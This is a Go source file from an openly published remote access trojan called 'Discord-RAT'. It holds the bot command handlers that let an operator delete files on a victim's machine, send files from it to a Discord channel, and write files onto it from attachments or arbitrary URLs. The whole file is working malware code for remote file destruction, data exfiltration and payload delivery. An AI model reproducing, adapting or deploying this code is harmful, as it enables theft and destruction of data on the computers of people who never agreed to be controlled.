/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package commands

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/codeuk/discord-rat/pkg/util"
)

func HandleFileDelete(message *BotMessage) {
	// Parse delete command (find file to delete).
	commandBreakdown := strings.Fields(message.Message.Content)

	if len(commandBreakdown) == 1 {
		// Invalid delete command syntax.
		message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command usage** ```delete <file path> \nExample: \"delete file.txt\"```")
	} else {
		files := commandBreakdown[1:]
		for _, file := range files {
			// Attempt to remove the passed file.
			if err := os.Remove(file); err != nil {
				message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Failed to delete file** ```%s```", file))
				continue
			}

			message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Successfully deleted file** ```%s```", file))
		}
	}
}

func HandleFileDownload(message *BotMessage) {
	// Parse download command (find file to download).
	commandBreakdown := strings.Fields(message.Message.Content)

	if len(commandBreakdown) == 1 {
		// Invalid download command syntax.
		message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command usage** ```download <file path> \nExample: \"download file.txt\"```")
	} else {
		files := commandBreakdown[1:]
		for _, file := range files {
			// Attempt to open and read the passed source file.
			fileReader, err := os.Open(file)
			if err != nil {
				message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Failed to download file** ```%s```", file))
				continue
			}

			// Send the downloaded file back to the agents command channel.
			message.Session.ChannelFileSend(message.Message.ChannelID, file, bufio.NewReader(fileReader))
		}
	}
}

func HandleFileUpload(message *BotMessage) {
	// Parse upload command (find file path to upload to).
	commandBreakdown := strings.Split(message.Message.Content, " ")

	if len(commandBreakdown) == 1 {
		// Invalid upload command syntax.
		message.Session.ChannelMessageSend(message.Message.ChannelID, "**Command usage** ```#1: upload <location to upload to> (along with attachment) \n#2: upload <location to upload to> <URL to download file from> \nExample: \"upload http://example.com/test.txt test.txt\"```")
	} else if len(commandBreakdown) == 2 {
		if len(message.Message.Attachments) == 0 {
			// No files were attached to the command message.
			message.Session.ChannelMessageSend(message.Message.ChannelID, "**No file was attached!**")
			return
		}

		// Passed path to save the uploaded file to.
		fileDownloadPath := commandBreakdown[1]

		// Download and save the file from the command message attachment.
		util.DownloadFile(fileDownloadPath, message.Message.Attachments[0].URL)
	} else {
		// Download and save the file from the passed URL.
		util.DownloadFile(commandBreakdown[2], commandBreakdown[1])
	}
}
